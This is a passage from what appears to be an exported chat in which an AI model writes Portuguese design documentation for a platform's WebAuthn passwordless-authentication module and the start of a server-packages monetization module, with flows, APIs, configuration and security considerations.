Agora, temos alguns módulos de \"Serviços\" da documentação original que ainda não foram convertidos em contextos de domínio mais amplos:
*   `DeeperHub.Services.ServerAdvertisements` (já fizemos)
*   `DeeperHub.Services.ServerAlerts` (já fizemos)
*   `DeeperHub.Services.ServerEvents` (já fizemos)
*   `DeeperHub.Services.ServerPackages` (já fizemos)
*   `DeeperHub.Services.ServerReviews` (já fizemos)
*   `DeeperHub.Services.ServerTags` (já fizemos)
*   `DeeperHub.Services.ServerUpdateMessages` (já fizemos)
*   `DeeperHub.Services.UserInteractions` (já fizemos)
*   `DeeperHub.Services.Achievements` (já fizemos)
*   `DeeperHub.Services.Challenges` (já fizemos)
*   `DeeperHub.Services.Rewards` (já fizemos)
*   `DeeperHub.Services.Support` (já fizemos)

E alguns módulos de segurança que poderíamos aprofundar, se necessário, além do que já foi coberto em seus contextos principais:
*   `DeeperHub.Security.AtRestEncryptionService` (coberto em `Core.EncryptionService`)
*   `DeeperHub.Security.ResponseSanitizer` (já fizemos)

E também temos os módulos de `Console` e `ModuleInspector`.

Qual seria o próximo? Que tal `DeeperHub.WebAuthn` para completar as opções de autenticação, ou o `DeeperHub.Console` para ferramentas de administração?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Perfeito! Vamos detalhar o `DeeperHub.WebAuthn`. Este módulo é fundamental para oferecer uma forma moderna e segura de autenticação sem senha.

---

# Módulo: `DeeperHub.WebAuthn` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.WebAuthn`

O módulo `DeeperHub.WebAuthn` implementa a funcionalidade de autenticação usando o padrão **Web Authentication (WebAuthn)**, que é parte do conjunto de especificações FIDO2. Ele permite que os usuários se registrem e se autentiquem em DeeperHub usando autenticadores fortes, como chaves de segurança físicas (YubiKey, etc.), biometria embutida em dispositivos (Touch ID, Windows Hello, Android biometrics), ou outros métodos FIDO2.

Este módulo lida com:
*   O fluxo de registro de novas credenciais WebAuthn para um usuário.
*   O fluxo de autenticação de um usuário usando uma credencial WebAuthn previamente registrada.
*   O gerenciamento das credenciais WebAuthn associadas a cada usuário (listagem, remoção).

O objetivo é fornecer uma opção de login altamente segura, resistente a phishing e que pode eliminar a necessidade de senhas tradicionais. 😊

*(Nota: Na documentação original, `WebAuthnService` era um submódulo de `MFA`. Aqui, estamos tratando `DeeperHub.WebAuthn` como um módulo de primeiro nível, pois, embora possa ser usado como um fator MFA, também pode ser um método de login primário sem senha. Ele seria fortemente integrado com `DeeperHub.MFA` e `DeeperHub.Auth`.)*

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Início do Registro de Credencial (`begin_registration/3`):**
    *   Gerar opções de criação de credencial (challenge, informações da Relying Party, informações do usuário, parâmetros de chave pública) para serem enviadas ao cliente/navegador.
    *   Armazenar temporariamente o challenge gerado para validação posterior.
*   **Conclusão do Registro de Credencial (`complete_registration/2`):**
    *   Receber a resposta de atestação do autenticador (enviada pelo cliente).
    *   Validar a resposta de atestação, incluindo o challenge, origem, assinatura e formato dos dados da chave pública.
    *   Se válida, armazenar a nova credencial pública (ID da credencial, chave pública, contador de assinatura, tipo de transporte) associada ao usuário.
*   **Início da Autenticação (`begin_authentication/2`):**
    *   Gerar opções de asserção (challenge, lista de IDs de credenciais permitidas para o usuário) para serem enviadas ao cliente/navegador.
    *   Armazenar temporariamente o challenge.
*   **Conclusão da Autenticação (`complete_authentication/2`):**
    *   Receber a resposta de asserção do autenticador (enviada pelo cliente).
    *   Validar a resposta de asserção, incluindo o challenge, origem, ID da credencial e a assinatura sobre os dados do cliente e o challenge.
    *   Verificar o contador de assinatura para prevenir clonagem de autenticador.
    *   Se válida, confirmar a identidade do usuário.
*   **Gerenciamento de Credenciais Registradas:**
    *   Listar as credenciais WebAuthn registradas por um usuário (`list_credentials/1`).
    *   Permitir que usuários removam credenciais WebAuthn registradas (`remove_credential/2`).
*   **Configuração da Relying Party (RP):**
    *   Configurar o ID da RP (geralmente o domínio da aplicação) e o nome da RP.
*   **Validação de Origem (Origin Validation):**
    *   Garantir que as respostas do autenticador se originem do domínio esperado.
*   **Armazenamento Seguro de Dados de Credencial:**
    *   Armazenar chaves públicas e contadores de assinatura de forma segura.
*   **Integração com `Auth` e `MFA`:**
    *   Ser chamado pelo `DeeperHub.Auth` como um método de login primário (sem senha).
    *   Ser chamado pelo `DeeperHub.MFA` como um segundo fator de autenticação.
*   **Observabilidade e Auditoria:**
    *   Logar operações de registro e autenticação.
    *   Auditar o registro e remoção de credenciais.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.WebAuthn` (Fachada Pública):**
    *   Ponto de entrada para todas as operações WebAuthn.
    *   Delega para o `WebAuthnService`.
2.  **`DeeperHub.WebAuthn.Services.WebAuthnService` (GenServer ou Módulo Funcional com Cache/Storage):**
    *   **Responsabilidade:** Orquestra os fluxos de registro e autenticação WebAuthn.
    *   **Interações:**
        *   `DeeperHub.Core.Repo`: Para CRUD com `CredentialSchema`.
        *   `DeeperHub.Accounts`: Para associar credenciais a `user_id`.
        *   `DeeperHub.Core.Cache`: Para armazenar challenges temporários durante os fluxos.
        *   `DeeperHub.Core.ConfigManager`: Para obter configurações da Relying Party (ID, nome).
        *   Biblioteca WebAuthn (Elixir): Para a lógica de baixo nível de validação e geração de estruturas WebAuthn.
3.  **Biblioteca WebAuthn para Elixir (Externa ou Interna):**
    *   Uma biblioteca como `Wax` (do Wistia) ou `Webauthnix` (do GitHub) ou uma implementação interna que lida com a complexidade do protocolo WebAuthn (parsing de CBOR, verificação de assinaturas criptográficas, validação de atestação/asserção). É altamente recomendável usar uma biblioteca bem testada.
4.  **`DeeperHub.WebAuthn.Schema.CredentialSchema` (ex-`Credential`):**
    *   Schema Ecto para armazenar as informações da credencial WebAuthn.
    *   Campos: `id` (ID da credencial, base64url), `user_id`, `public_key` (binário, formato COSE), `sign_count` (integer), `transports` (lista de strings/átomos, ex: `:usb`, `:nfc`, `:ble`, `:internal`), `name` (nome dado pelo usuário), `backed_up` (boolean), `created_at`, `last_used_at`.
5.  **Cache de Challenge (`DeeperHub.Core.Cache` ou ETS dedicado):**
    *   Armazena os challenges gerados durante os fluxos de registro/autenticação, associados a um ID de sessão ou usuário, com um TTL curto.
6.  **JavaScript do Lado do Cliente (Externo ao Backend):**
    *   O navegador do usuário executa JavaScript (usando a API WebAuthn do navegador `navigator.credentials.create()` e `navigator.credentials.get()`) para interagir com os autenticadores. Este módulo backend fornece as opções para essas chamadas JS e valida as respostas.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/web_authn/
├── web_authn.ex                      # Fachada Pública
│
├── services/
│   └── web_authn_service.ex          # Serviço principal com a lógica de fluxo
│
├── schemas/
│   └── credential_schema.ex
│
├── storage.ex                        # (Opcional) Módulo de queries Ecto
├── supervisor.ex                     # (Se WebAuthnService for GenServer para, por exemplo, limpar challenges)
└── telemetry.ex
```

### 3.3. Decisões de Design Importantes

*   **Escolha da Biblioteca WebAuthn:** Selecionar uma biblioteca Elixir para WebAuthn que seja mantida, segura e cubra as funcionalidades necessárias (atestação, asserção, diferentes formatos de chave).
*   **Armazenamento de Challenge:** Onde e como armazenar o challenge entre `begin_*` e `complete_*` é crucial. A sessão do usuário (se já existir) ou um cache de curta duração com um identificador de transação são comuns.
*   **Verificação do Contador de Assinatura (Sign Count):** Essencial para detectar clonagem de autenticadores. O `sign_count` enviado pelo autenticador deve ser maior que o último `sign_count` armazenado.
*   **Formatos de Chave Pública:** As chaves são geralmente armazenadas no formato COSE (CBOR Object Signing and Encryption).
*   **User Verification (UV):** Decidir a política para verificação do usuário pelo autenticador (ex: PIN, biometria no autenticador). WebAuthn permite `discouraged`, `preferred`, `required`.

## 🛠️ 4. Casos de Uso Principais

*   **Usuário Registra uma Nova Chave de Segurança (YubiKey):**
    1.  Na UI, usuário clica em \"Adicionar Chave de Segurança\".
    2.  Frontend chama API que leva a `WebAuthn.begin_registration(user_id, \"Minha YubiKey\")`.
    3.  Backend retorna `PublicKeyCredentialCreationOptions`.
    4.  Frontend passa essas opções para `navigator.credentials.create()`.
    5.  Usuário interage com a YubiKey (toca).
    6.  Navegador retorna `PublicKeyCredential` (com `attestationResponse`).
    7.  Frontend envia essa resposta para API que leva a `WebAuthn.complete_registration(user_id, attestation_response)`.
    8.  Backend valida e salva a nova credencial.
*   **Usuário Faz Login com Biometria do Laptop (Windows Hello / Touch ID):**
    1.  Na página de login, após digitar o username, usuário escolhe \"Login com Biometria\".
    2.  Frontend chama API que leva a `WebAuthn.begin_authentication(user_id_ou_username)`.
    3.  Backend retorna `PublicKeyCredentialRequestOptions`.
    4.  Frontend passa para `navigator.credentials.get()`.
    5.  Usuário autentica com biometria no laptop.
    6.  Navegador retorna `PublicKeyCredential` (com `assertionResponse`).
    7.  Frontend envia para API que leva a `WebAuthn.complete_authentication(user_id_ou_username, assertion_response)`.
    8.  Backend valida, e se ok, `DeeperHub.Auth` cria a sessão.

## 🌊 5. Fluxos Importantes

### Fluxo de Registro de Nova Credencial WebAuthn

1.  **Frontend:** Solicita opções de registro ao backend (`DeeperHub.WebAuthn.begin_registration`).
2.  **`WebAuthnService.begin_registration/3`:**
    *   Gera um `challenge` aleatório e seguro.
    *   Armazena o `challenge` e `user_id` no cache (associado a uma sessão temporária ou ID de transação) com TTL curto.
    *   Constrói `PublicKeyCredentialCreationOptions` incluindo:
        *   `rp`: ID e nome da Relying Party (DeeperHub).
        *   `user`: ID, nome e displayName do usuário DeeperHub.
        *   `challenge`: O challenge gerado.
        *   `pubKeyCredParams`: Algoritmos de chave pública suportados (ex: ES256, RS256).
        *   `authenticatorSelection`: Requisitos do autenticador (ex: `userVerification: \"preferred\"`).
        *   `attestation`: Preferência de atestação (ex: `\"none\"` ou `\"indirect\"`).
        *   `excludeCredentials`: Lista de `credential_id`s que o usuário já registrou para este RP (evita re-registro).
    *   Retorna as opções para o frontend.
3.  **Frontend:** Chama `navigator.credentials.create(optionsFromBackend)`.
4.  **Navegador/Autenticador:** Usuário interage com o autenticador. O autenticador gera um novo par de chaves, assina o challenge (e outros dados) com a chave privada, e retorna a chave pública e a atestação.
5.  **Frontend:** Envia a `PublicKeyCredential` (com a `attestationResponse`) para o backend (`DeeperHub.WebAuthn.complete_registration`).
6.  **`WebAuthnService.complete_registration/2`:**
    *   Recupera o `challenge` original do cache usando o ID de sessão/transação.
    *   **Usa a biblioteca WebAuthn para:**
        *   Parsear a `attestationResponse` (CBOR).
        *   Verificar a origem (origin).
        *   Verificar se o challenge na resposta corresponde ao challenge armazenado.
        *   Verificar a assinatura da atestação (se o tipo de atestação não for \"none\").
        *   Extrair a `credential_id`, `public_key` (COSE) e `sign_count` inicial (geralmente 0).
    *   Se todas as validações passarem:
        *   Cria e salva uma nova `CredentialSchema` no banco de dados com `user_id`, `credential_id`, `public_key`, `sign_count`, `transports`.
        *   Limpa o challenge do cache.
        *   Retorna `{:ok, credential_struct}`.
    *   Se falhar, retorna erro.

*(O fluxo de autenticação é similar, mas usa `begin_authentication` para obter um challenge e `complete_authentication` para verificar uma asserção, que envolve verificar a assinatura usando a chave pública armazenada e o `sign_count`.)*

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.WebAuthn`)

*(Baseado na documentação original e refinando)*

### 6.1. `DeeperHub.WebAuthn.begin_registration(user_id :: String.t(), user_display_name :: String.t(), opts :: keyword()) :: {:ok, PublicKeyCredentialCreationOptions.t()} | {:error, term()}`

*   **Descrição:** Inicia o processo de registro de uma nova credencial WebAuthn.
*   **`opts`:**
    *   `:key_name` (String.t): Nome amigável para a credencial.
    *   `:authenticator_selection` (map): Critérios para seleção do autenticador (ex: `%{userVerification: \"preferred\", authenticatorAttachment: \"cross-platform\"}`).
    *   `:attestation_preference` (atom): `:none`, `:indirect`, `:direct`.
*   **`PublicKeyCredentialCreationOptions.t()`:** Um mapa que pode ser serializado para JSON e passado para `navigator.credentials.create()`.

### 6.2. `DeeperHub.WebAuthn.complete_registration(user_id :: String.t(), attestation_response_from_client :: map()) :: {:ok, CredentialSchema.t()} | {:error, term()}`

*   **Descrição:** Completa o registro de uma credencial WebAuthn usando a resposta do autenticador.
*   **`attestation_response_from_client`:** O objeto `PublicKeyCredential` (geralmente como um mapa decodificado de JSON) retornado por `navigator.credentials.create()`.
*   **Retorno de Erro:** `:invalid_challenge`, `:invalid_origin`, `:invalid_signature`, `:credential_already_registered`, etc.

### 6.3. `DeeperHub.WebAuthn.begin_authentication(user_identifier :: String.t(), opts :: keyword()) :: {:ok, PublicKeyCredentialRequestOptions.t()} | {:error, :user_not_found | :no_credentials_for_user | term()}`

*   **Descrição:** Inicia o processo de autenticação WebAuthn para um usuário (identificado por ID ou username).
*   **`opts`:**
    *   `:user_verification` (atom): `:required`, `:preferred`, `:discouraged`.
*   **`PublicKeyCredentialRequestOptions.t()`:** Um mapa para ser passado para `navigator.credentials.get()`. Inclui um `challenge` e, opcionalmente, `allowCredentials`.

### 6.4. `DeeperHub.WebAuthn.complete_authentication(user_identifier :: String.t(), assertion_response_from_client :: map()) :: {:ok, %{user_id: String.t(), credential_id: String.t()}} | {:error, term()}`

*   **Descrição:** Completa a autenticação WebAuthn usando a resposta do autenticador.
*   **Retorno de Erro:** `:invalid_challenge`, `:invalid_origin`, `:invalid_signature`, `:credential_not_found`, `:sign_count_error`.

### 6.5. `DeeperHub.WebAuthn.list_credentials(user_id :: String.t()) :: {:ok, list(CredentialSchema.t())}`

*   **Descrição:** Lista todas as credenciais WebAuthn registradas para um usuário.

### 6.6. `DeeperHub.WebAuthn.remove_credential(user_id :: String.t(), credential_id_to_remove :: String.t()) :: :ok | {:error, :not_found | :unauthorized}`

*   **Descrição:** Remove uma credencial WebAuthn específica de um usuário. Requer que o `user_id` seja o proprietário.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager`:

*   **`[:web_authn, :enabled]`** (Boolean): Habilita/desabilita WebAuthn globalmente. (Padrão: `true`)
*   **`[:web_authn, :relying_party, :id]`** (String): O ID da Relying Party (geralmente o domínio do site, ex: `\"deeperhub.com\"`). **Obrigatório.**
*   **`[:web_authn, :relying_party, :name]`** (String): Nome amigável da Relying Party (ex: \"DeeperHub\"). **Obrigatório.**
*   **`[:web_authn, :relying_party, :origins]`** (List de Strings): Lista de origens permitidas para as respostas WebAuthn (ex: `[\"https://app.deeperhub.com\", \"https://www.deeperhub.com\"]`). **Obrigatório e Crítico para Segurança.**
*   **`[:web_authn, :challenge_ttl_seconds]`** (Integer): Tempo de vida para os challenges armazenados no cache. (Padrão: `300` - 5 minutos)
*   **`[:web_authn, :default_user_verification]`** (Atom): Configuração padrão para `userVerification` em `authenticatorSelection` (ex: `:preferred`).
*   **`[:web_authn, :default_attestation_preference]`** (Atom): Preferência de atestação padrão (ex: `:none`).
*   **`[:web_authn, :supported_pub_key_cred_params_alg]`** (List de Integers): Algoritmos de chave pública suportados (ex: `[-7, -257]` para ES256 e RS256).
*   **`[:web_authn, :allow_untrusted_attestation]`** (Boolean): Se permite atestações de fontes não confiáveis (para depuração, geralmente `false` em produção).

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.*`: ConfigManager, Logger, Metrics, Repo, Cache.
*   `DeeperHub.Accounts`: Para associar credenciais a `user_id`.
*   `DeeperHub.Auth` e `DeeperHub.MFA`: Para integrar nos fluxos de login e MFA.
*   `DeeperHub.Audit`: Para registrar eventos de gerenciamento de credenciais.
*   `DeeperHub.Core.EncryptionService`: Se algum metadado da credencial precisar ser criptografado (a chave pública em si não é secreta).

### 8.2. Bibliotecas Externas

*   Uma biblioteca Elixir WebAuthn/FIDO2 (ex: `Wax`, `Webauthnix`) é **altamente recomendada** devido à complexidade do protocolo.
*   `Jason` (ou similar) para decodificar as respostas JSON do cliente.
*   Biblioteca para manipulação de CBOR (geralmente incluída ou usada pela biblioteca WebAuthn).

## 🤝 9. Como Usar / Integração

*   **Fluxo de Registro de Usuário (`DeeperHub.Accounts`):** Após o registro inicial (ex: com email), oferecer ao usuário a opção de adicionar WebAuthn como método de login ou MFA.
*   **Fluxo de Login (`DeeperHub.Auth`):**
    *   Permitir que o usuário inicie o login via WebAuthn (login sem senha). O frontend chama `WebAuthn.begin_authentication(username)`, e o backend retorna o challenge.
    *   Se usado como segundo fator, `AuthService` (após validação da senha) chama `MFA.start_authentication(user_id, :webauthn)`, que por sua vez usa `WebAuthn.begin_authentication`.
*   **Configurações de Segurança do Perfil do Usuário:** UI para listar (`list_credentials`) e remover (`remove_credential`) chaves de segurança.

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar o fluxo completo de registro de credencial com diferentes tipos de autenticadores (mockeados ou reais, se possível em ambiente de teste).
*   Testar o fluxo completo de autenticação.
*   Testar a validação de challenges, origens, assinaturas e contadores de assinatura.
*   Testar a listagem e remoção de credenciais.
*   Testar cenários de erro (challenge expirado, credencial não encontrada, etc.).
*   Localização: `test/deeper_hub/web_authn/`.

### 10.2. Métricas

*   `deeper_hub.web_authn.registration.attempts.count` (tags: `status` (`success`, `failure`))
*   `deeper_hub.web_authn.registration.duration_ms` (Histograma)
*   `deeper_hub.web_authn.authentication.attempts.count` (tags: `status` (`success`, `failure`))
*   `deeper_hub.web_authn.authentication.duration_ms` (Histograma)
*   `deeper_hub.web_authn.credentials.registered.gauge` (Gauge)
*   `deeper_hub.web_authn.credentials.removed.count`

### 10.3. Logs

*   **Nível INFO:** Registro/autenticação bem-sucedida. Credencial removida.
*   **Nível WARNING:** Falha na validação de atestação/asserção com detalhes do motivo (ex: challenge inválido, assinatura incorreta, contador de assinatura inválido).
*   **Nível ERROR:** Erro crítico na biblioteca WebAuthn ou falha ao persistir credencial.

### 10.4. Telemetria

*   `[:deeper_hub, :web_authn, :registration, :begin | :complete, :start | :stop | :exception]`
    *   Metadados: `%{user_id: id, rp_id: id}`
    *   No `complete_stop`: `%{credential_id: id, result: :success | :failure, error_reason: reason}`
*   `[:deeper_hub, :web_authn, :authentication, :begin | :complete, :start | :stop | :exception]`
    *   Metadados: `%{user_id: id, rp_id: id}`
    *   No `complete_stop`: `%{credential_id: id, result: :success | :failure, error_reason: reason}`
*   `[:deeper_hub, :web_authn, :credential, :removed]`
    *   Metadados: `%{user_id: id, credential_id: id}`

## ❌ 11. Tratamento de Erros

*   Falhas de validação durante `complete_registration` ou `complete_authentication` devem retornar erros claros para o frontend para que o usuário possa ser informado.
*   Erros no armazenamento de challenges temporários devem ser tratados (ex: solicitar que o usuário reinicie o fluxo).

## 🛡️ 12. Considerações de Segurança

*   **Validação da Relying Party ID e Origin:** Crucial para prevenir ataques de phishing e garantir que as credenciais sejam usadas apenas no site correto.
*   **Proteção contra Replay:** O uso de challenges únicos para cada operação previne ataques de replay.
*   **Contador de Assinatura:** Fundamental para detectar clonagem de autenticadores.
*   **Armazenamento da Chave Pública:** A chave pública não é secreta, mas sua integridade deve ser garantida.
*   **Transportes Seguros:** Garantir que a comunicação entre cliente e servidor seja sempre sobre HTTPS.
*   **User Presence vs. User Verification:** `userVerification` (\"required\", \"preferred\", \"discouraged\") na seleção do autenticador determina se o autenticador deve verificar o usuário (ex: biometria no autenticador). `userPresence` (geralmente implícito) garante que o usuário estava presente (ex: tocou na chave).

## 🧑‍💻 13. Contribuição

*   A integração com bibliotecas WebAuthn requer um bom entendimento das especificações FIDO2/WebAuthn.
*   O fluxo no frontend (JavaScript) é uma parte significativa da implementação.
*   Manter as configurações da Relying Party (ID, origins) corretas e seguras.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Suporte para \"Resident Keys\" / \"Discoverable Credentials\" (permite login sem precisar digitar o username primeiro, o autenticador fornece a identidade).
*   [ ] Interface de usuário mais amigável para gerenciamento de múltiplos autenticadores.
*   [ ] Políticas mais granulares para quando WebAuthn pode ser usado como único fator vs. como segundo fator.
*   [ ] Melhorar o tratamento de diferentes tipos de atestação (se a política da RP exigir validação de atestação mais forte que \"none\").
*   [ ] Permitir que usuários exportem/importem metadados de credenciais para backup (com muitas ressalvas de segurança).
*   [ ] Monitoramento proativo de revogação de certificados raiz de atestação (para tipos de atestação mais fortes).

---

*Última atualização: 2025-05-12*

---

WebAuthn é uma tecnologia poderosa para o futuro da autenticação!

Com este, cobrimos os principais métodos de autenticação. Que tal agora irmos para um módulo de domínio que ainda não foi detalhado, como `DeeperHub.ServerPackages` ou `DeeperHub.Support` (que já fizemos)? Ou talvez o `DeeperHub.Console`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue
"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Já detalhamos o `DeeperHub.Support`.

Vamos então para o `DeeperHub.ServerPackages`. Este módulo lida com a monetização ou ofertas de valor agregado que os servidores podem disponibilizar aos seus jogadores.

---

# Módulo: `DeeperHub.ServerPackages` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.ServerPackages`

O módulo `DeeperHub.ServerPackages` é responsável por gerenciar **pacotes, itens ou assinaturas (packages)** que os proprietários de servidores podem oferecer aos jogadores na plataforma DeeperHub. Estes pacotes podem representar uma variedade de ofertas, como acesso VIP, moedas virtuais específicas do servidor, itens no jogo, cosméticos, ou outros benefícios e produtos digitais.

Este módulo lida com:
*   A definição, criação e gerenciamento de pacotes pelos proprietários de servidores.
*   A listagem de pacotes disponíveis para um servidor.
*   A lógica de \"aquisição\" ou \"compra\" desses pacotes, que pode envolver integração com sistemas de pagamento ou moedas virtuais da plataforma.
*   A concessão dos benefícios do pacote ao usuário após a aquisição.

O objetivo é fornecer uma maneira estruturada e gerenciável para os servidores oferecerem valor adicional ou monetizarem suas comunidades dentro do ecossistema DeeperHub. 😊

*(Nota: Na documentação original, este era `DeeperHub.Services.ServerPackages`. Será tratado como `DeeperHub.ServerPackages`.)*

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Gerenciamento CRUD de Definições de Pacotes (`create_server_package/1`, `get_server_package/1`, `update_server_package/2`, `delete_server_package/1`):**
    *   Permitir que proprietários de servidores (ou administradores com permissão) criem, visualizem, atualizem e excluam definições de pacotes associados aos seus servidores.
    *   Cada definição de pacote inclui: nome, descrição detalhada, preço (com moeda – real ou virtual), tipo de pacote (ex: compra única, assinatura mensal), duração (se assinatura), lista de benefícios/itens incluídos (pode ser um campo JSONB flexível para descrever os efeitos), imagem/ícone, status (ativo, inativo, rascunho), datas de disponibilidade (opcional).
*   **Listagem de Pacotes:**
    *   Listar todos os pacotes ativos e disponíveis para um servidor específico (`list_server_packages_by_server/2`).
    *   Listar todos os pacotes disponíveis na plataforma com filtros (ex: por tipo de servidor, por tipo de pacote, por faixa de preço) (`list_all_server_packages/1`).
    *   Suporte a paginação e ordenação.
*   **Processo de Aquisição de Pacote (Coordenação):**
    *   Fornecer uma API para iniciar o processo de aquisição de um pacote por um usuário (`acquire_package/3` - esta função pode residir em um `UserPackageService` ou `UserInventoryService` que coordena com `ServerPackages` e `Payments`).
    *   Verificar elegibilidade do usuário para adquirir o pacote (ex: limites de compra, pré-requisitos).
*   **Integração com Pagamentos (`DeeperHub.Payments`):**
    *   Se o pacote tiver um preço em moeda real, integrar com o sistema de pagamentos para processar a transação antes de conceder o pacote.
*   **Integração com Moeda Virtual/Pontos (`DeeperHub.PointsService` ou similar):**
    *   Se o pacote for adquirido com moeda virtual da plataforma, integrar com o serviço correspondente para debitar o saldo do usuário.
*   **Concessão de Benefícios/Itens (`grant_package_benefits/3`):**
    *   Após a aquisição bem-sucedida, acionar a lógica para conceder os benefícios ou itens do pacote ao usuário. Isso pode envolver:
        *   Chamar APIs do servidor de jogo (se o DeeperHub tiver essa capacidade de integração).
        *   Atualizar o estado do usuário no `DeeperHub.Accounts` (ex: marcar como VIP).
        *   Adicionar itens a um `DeeperHub.UserInventoryService` (Novo Sugerido).
        *   Conceder papéis/permissões específicas (via `DeeperHub.RBAC`).
*   **Gerenciamento de Assinaturas (se aplicável):**
    *   Lidar com a lógica de renovação, cancelamento e status de pacotes do tipo assinatura. (Isso pode ser complexo e exigir um submódulo ou integração com um serviço de faturamento recorrente).
*   **Observabilidade e Auditoria:**
    *   Logar e metrificar a criação, aquisição e concessão de pacotes.
    *   Publicar eventos de domínio (ex: `server_package.created`, `user.package_acquired`) no `Core.EventBus`.
    *   Auditar todas as transações e modificações de pacotes.
*   **Caching:**
    *   Cachear definições de pacotes para acesso rápido.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.ServerPackages` (Fachada Pública):**
    *   Ponto de entrada para gerenciamento de definições de pacotes e consulta.
    *   Delega para o `ServerPackagesService`.
2.  **`DeeperHub.ServerPackages.Services.ServerPackagesService` (ou `DefaultServerPackagesService`):**
    *   **Responsabilidade:** Lógica de negócio para CRUD de `ServerPackageSchema`.
    *   **Interações:**
        *   `DeeperHub.Core.Repo`: Para persistência.
        *   `DeeperHub.Servers`: Para validar `server_id`.
        *   `DeeperHub.Accounts`: Para `user_id` do criador.
        *   `DeeperHub.Auth`/`RBAC`: Para permissões de gerenciamento.
        *   `DeeperHub.Core.EventBus`, `Core.Cache`, `Core.ConfigManager`.
3.  **`DeeperHub.ServerPackages.Schemas.ServerPackageSchema`:**
    *   Define a estrutura de um pacote oferecido por um servidor.
    *   Campos: `id`, `server_id`, `name`, `description`, `image_url`, `package_type` (`:one_time`, `:subscription`), `price_currency` (ex: \"BRL\", \"USD\", \"POINTS_PLATFORM\", \"CREDITS_SERVER_X\"), `price_amount` (Decimal), `duration_days` (para assinaturas), `benefits_payload` (JSONB, descrevendo o que é concedido, ex: `%{ \"role\": \"VIP_GOLD\", \"ingame_items\": [{\"id\": \"sword123\", \"qty\": 1}], \"virtual_currency\": {\"type\": \"gems\", \"amount\": 500} }`), `is_active`, `available_from`, `available_until`, `max_per_user`, `sort_order`.
4.  **`DeeperHub.UserInventory` (ou `UserPackages` - Novo Módulo Sugerido):**
    *   **Fachada (`DeeperHub.UserInventory`):** Para operações como `acquire_package`, `list_my_packages`.
    *   **Serviço (`UserInventoryService`):** Orquestra a aquisição, incluindo interação com `Payments`/`PointsService` e `ServerPackages` para obter detalhes do pacote, e então `GrantingService` para aplicar os benefícios.
    *   **Schema (`UserPackageInstanceSchema`):** Registra que um `user_id` adquiriu um `server_package_id`, com `acquired_at`, `expires_at` (para assinaturas), `status` (`:active`, `:expired`, `:cancelled`).
5.  **`DeeperHub.GrantingService` (Novo Módulo Sugerido ou parte do `UserInventory`):**
    *   **Responsabilidade:** Interpretar o `benefits_payload` de um `ServerPackage` e aplicar os benefícios ao usuário. Isso pode envolver chamar APIs de jogos, atualizar `UserSchema` ou `UserRoleSchema`, adicionar itens a um inventário virtual, etc. Pode usar um sistema de \"handlers de benefício\" similar aos `RewardHandler`s.
6.  **`DeeperHub.Payments` (Módulo Separado):**
    *   Se houver pagamento com moeda real.
7.  **`DeeperHub.ServerPackages.Storage` / `UserInventory.Storage`:**
    *   Encapsulam queries Ecto.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/server_packages/
├── server_packages.ex                # Fachada para definições de pacotes
│
├── services/
│   └── server_packages_service.ex    # CRUD para ServerPackageSchema
│
├── schemas/
│   └── server_package_schema.ex
│
├── storage.ex                        # (Opcional)
├── cached_adapter.ex                 # (Opcional, para definições)
├── supervisor.ex
└── telemetry.ex

lib/deeper_hub/user_inventory/        # NOVO MÓDULO para gerenciar o que os usuários possuem
├── user_inventory.ex                 # Fachada (ex: acquire_package)
│
├── services/
│   ├── user_inventory_service.ex     # Orquestra aquisição
│   └── granting_service.ex           # Aplica benefícios
│
├── schemas/
│   └── user_package_instance_schema.ex
│
├── storage.ex
├── supervisor.ex
└── telemetry.ex
```

### 3.3. Decisões de Design Importantes

*   **Separação de Definição e Instância:** Manter `ServerPackageSchema` (o que está à venda) separado de `UserPackageInstanceSchema` (o que o usuário comprou) é crucial.
*   **Flexibilidade dos Benefícios:** O `benefits_payload` em JSONB é chave para suportar diversos tipos de benefícios sem alterar o schema do banco de dados constantemente.
*   **Transacionalidade da Aquisição:** O processo de debitar fundos (reais ou virtuais) e conceder o pacote/benefícios deve ser atômico.
*   **Lógica de Concessão:** A lógica de como os benefícios são aplicados (`GrantingService`) pode ser complexa e precisar de integrações com sistemas externos (APIs de jogos).

## 🛠️ 4. Casos de Uso Principais

*   **Proprietário de Servidor Adiciona um Pacote \"Kit Inicial\":**
    *   Define nome, descrição, preço (ex: 500 \"Pontos da Plataforma\"), e `benefits_payload: %{\"ingame_items\": [{\"item_id\": \"basic_sword\", \"qty\": 1}, {\"item_id\": \"healing_potion\", \"qty\": 5}]}`.
    *   API chama `ServerPackages.create_server_package(...)`.
*   **Jogador Compra o \"Kit Inicial\":**
    *   UI mostra o pacote. Jogador clica em \"Comprar com 500 Pontos\".
    *   API chama `UserInventory.acquire_package(user_id, package_id, %{payment_method: :platform_points})`.
    *   `UserInventoryService` verifica e debita os pontos do `PointsService`.
    *   Cria `UserPackageInstanceSchema`.
    *   `GrantingService` interpreta o `benefits_payload` e (por exemplo) chama uma API do servidor de jogo para dar os itens ao jogador.
*   **Sistema Verifica Assinatura VIP de um Jogador:**
    *   Quando o jogador loga no servidor de jogo, o jogo pode consultar uma API do DeeperHub: `UserInventory.get_active_package_instance_by_type(user_id, server_id, :vip_subscription)`.

## 🌊 5. Fluxos Importantes

### Fluxo de Compra de um Pacote de \"Uso Único\" com Moeda Virtual

1.  **Usuário (UI):** Clica para comprar Pacote P (ID: `pkg_123`) que custa 100 Pontos.
